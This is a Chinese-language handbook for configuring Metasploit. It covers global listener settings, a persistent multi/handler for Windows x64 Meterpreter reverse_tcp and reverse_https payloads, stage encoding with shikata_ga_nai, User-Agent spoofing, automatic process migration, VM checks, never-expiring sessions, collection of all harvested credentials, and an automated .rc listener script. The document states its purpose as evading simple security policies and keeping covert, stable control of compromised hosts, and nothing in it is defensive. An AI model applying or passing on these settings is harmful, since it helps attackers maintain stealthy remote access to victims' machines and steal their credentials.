# Metasploit 参数配置与载荷调优手册

## 1. 全局环境设置 (Global Configuration)

全局设置通过 `setg` 完成，配置后在所有模块中生效，减少重复录入。

* **设置全局监听 IP (LHOST)**
`setg LHOST 0.0.0.0`
* **设置全局监听端口 (LPORT)**
`setg LPORT 60907`
* **设置全局通信超时 (针对高延迟隧道如 frp)**
`setg CommTimeout 60`
* **设置 Session 存活心跳超时**
`setg SessionCommunicationTimeout 60`
* **设置控制台显示风格 (如启用颜色)**
`setg ConsoleLogging true`
* **保存当前全局配置到配置文件**
`save` (此操作会将配置写入 `~/.msf4/config`，下次启动自动加载)

---

## 2. 监听器 (handler) 核心参数详解

在使用 `exploit/multi/handler` 时，以下参数决定了连接的稳定性和隐蔽性。

* **加载监听模块**
`use exploit/multi/handler`
* **设置载荷类型**
`set payload windows/x64/meterpreter/reverse_tcp`
* **开启持续监听 (防止 Session 上线后监听关闭)**
`set ExitOnSession false`
* **设置后台运行**
`exploit -j -z` ( `-j` 任务模式运行，`-z` 成功后不立即进入交互)
* **设置高级重连选项 (反向连接重试频率)**
`set ReverseListenerBindAddress 127.0.0.1` (仅绑定本地回环，配合隧道使用)
* **防止监听进程被杀**
`set AutoRunScript post/windows/manage/migrate` (上线后自动执行迁移脚本)

---

## 3. 载荷 (Payload) 进阶配置

在生成或配置 Payload 时，可以通过设置高级参数绕过简单的安全策略。

### 3.1 传输特征微调 (Stage Options)

* **设置 Stage 传输重试次数**
`set StagerRetries 10`
* **设置 Stage 传输间隔**
`set StagerRetryWait 5`
* **启用 Stage 签名校验 (防止中间人拦截)**
`set EnableStageEncoding true` (对传输的第二阶段 DLL 进行编码混淆)
* **指定 Stage 编码器**
`set StageEncoder x64/shikata_ga_nai`

### 3.2 隐蔽性配置 (HTTPS 载荷特有)

如果使用 `windows/x64/meterpreter/reverse_https`：

* **自定义 User-Agent (伪装正常流量)**
`set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"`
* **设置证书校验**
`set StagerVerifySSLCert true`
* **自定义 URL 路径特征**
`set HttpUnknownRequestResponse "404 Not Found"` (对非预期请求返回 404)

---

## 4. 数据库与会话管理配置

* **查看数据库连接状态**
`db_status`
* **自动保存所有收割的 Creds**
`setg DB_ALL_CREDS true`
* **限制 Session 自动断开时间**
`setg SessionExpirationTimeout 0` (设置为 0 表示永不过期)
* **设置自动执行命令**
`set InitialAutoRunScript "checkvm"` (上线后立即检查是否为虚拟机)

---

## 5. 常见配置故障排查

* **强制重置数据库连接 (当数据库锁定或无法同步时)**
`db_disconnect`
`db_connect msf:qwq@127.0.0.1:5432/msf`
* **清除所有挂起的任务**
`jobs -K`
* **强制关闭所有活动 Session**
`sessions -K`
* **重置当前模块参数**
`unset all`

---

## 6. 自动化配置脚本 (Resource Scripts)

你可以将上述命令写入 `.rc` 文件实现自动化。

* **创建自动化脚本 `auto_listen.rc**`
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 60907
set ExitOnSession false
exploit -j

```

* **启动时加载脚本**
`msfconsole -r auto_listen.rc`
